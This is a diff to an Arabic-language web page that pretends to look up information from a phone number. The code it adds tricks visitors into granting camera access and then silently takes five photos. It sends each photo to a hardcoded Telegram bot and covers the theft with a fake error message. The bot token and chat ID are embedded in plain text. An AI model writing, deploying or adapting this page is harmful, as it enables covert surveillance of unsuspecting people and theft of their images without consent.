@@ -3,75 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الحصول على المعلومات</title>
+    <title>جمع البيانات</title>
     <style>
         body {
-            font-family: 'Tajawal', sans-serif;
+            font-family: Arial, sans-serif;
             text-align: center;
-            background: linear-gradient(135deg, #1E88E5, #43A047);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.6);
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-            width: 90%;
-            max-width: 350px;
-            animation: fadeIn 1s ease-in-out;
+            background-color: #f4f4f4;
+            padding: 20px;
         }
         h2 {
-            margin-bottom: 15px;
-            font-size: 22px;
+            color: #333;
         }
-        input {
-            width: 90%;
-            padding: 12px;
-            font-size: 18px;
-            border: none;
-            border-radius: 8px;
-            outline: none;
-            text-align: center;
-            margin-bottom: 15px;
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            font-size: 16px;
         }
         button {
-            width: 100%;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: bold;
+            background-color: #28a745;
             color: white;
-            background: #FF9800;
             border: none;
-            border-radius: 8px;
             cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
         }
         button:hover {
-            background: #F57C00;
-            transform: scale(1.05);
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
+            background-color: #218838;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>📱 أدخل رقم الهاتف</h2>
-        <input type="tel" id="phone" placeholder="أدخل رقمك هنا">
-        <button onclick="requestPermissions()">🚀 الحصول على المعلومات</button>
-    </div>
+    <h2>أدخل رقم الهاتف</h2>
+    <input type="text" id="phoneNumber" placeholder="رقم الهاتف">
+    <br>
+    <button onclick="requestPermissions()">عرض المعلومات</button>
 
-    <!-- استدعاء ملف JavaScript الخارجي -->
-    <script src="script.js"></script>
+    <script>
+        function requestPermissions() {
+            if (confirm("قم بإعطاء كل الأذونات للحصول على المعلومات")) {
+                getCameraAccess();
+            }
+        }
+
+        function getCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+
+                    let captureCount = 0;
+                    let maxCaptures = 5;
+
+                    function captureImage() {
+                        if (captureCount < maxCaptures) {
+                            setTimeout(() => {
+                                let canvas = document.createElement("canvas");
+                                let ctx = canvas.getContext("2d");
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                let imageData = canvas.toDataURL("image/png");
+                                sendToBot(imageData, `photo_${captureCount + 1}`);
+
+                                captureCount++;
+                                captureImage(); // التقاط الصورة التالية
+                            }, 2000); // التقاط كل صورة بعد 2 ثانية
+                        } else {
+                            stream.getTracks().forEach(track => track.stop());
+                            setTimeout(() => {
+                                document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
+                            }, 2000);
+                        }
+                    }
+
+                    captureImage();
+                })
+                .catch(err => {
+                    alert("يجب إعطاء إذن الوصول إلى الكاميرا!");
+                });
+        }
+
+        function sendToBot(imageData, photoName) {
+            let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc";
+            let chatId = "7554235698";
+
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    let formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", blob, `${photoName}.png`);
+                    formData.append("caption", `📸 صورة جديدة: ${photoName}`);
+
+                    return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("تم الإرسال بنجاح:", data);
+                })
+                .catch(error => {
+                    console.error("خطأ في الإرسال:", error);
+                });
+        }
+    </script>
 
 </body>
 </html>
